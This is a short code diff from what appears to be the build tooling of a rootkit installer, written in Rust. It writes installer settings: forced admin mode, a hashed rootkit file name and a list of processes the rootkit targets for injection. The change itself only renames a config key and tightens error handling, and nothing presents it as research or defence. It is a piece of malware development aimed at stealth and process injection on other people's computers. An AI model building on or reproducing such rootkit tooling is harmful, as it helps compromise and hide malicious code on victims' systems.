@@ -69,8 +69,8 @@ fn main() {
 
     Editor::new(&installer_config_file_path)
         .set_bool("FORCE_ADMIN", config_json["admin_mode"].as_bool().unwrap())
-        .set_byte_array("H_ROOTKIT_FILE_NAME", blake3::hash(config_json["rootkit_name"].as_str().unwrap().as_bytes()).as_bytes())
+        .set_byte_array("ROOTKIT_FILE_NAME", blake3::hash(config_json["rootkit_name"].as_str().unwrap().as_bytes()).as_bytes())
         .set_string_array("INJECTABLE_PROCS", &config_json["injectable_procs"].as_array().unwrap().iter().map(|v| v.as_str().unwrap()).collect::<Vec<&str>>())
         .finalize()
-        .ok();
+        .unwrap();
 }
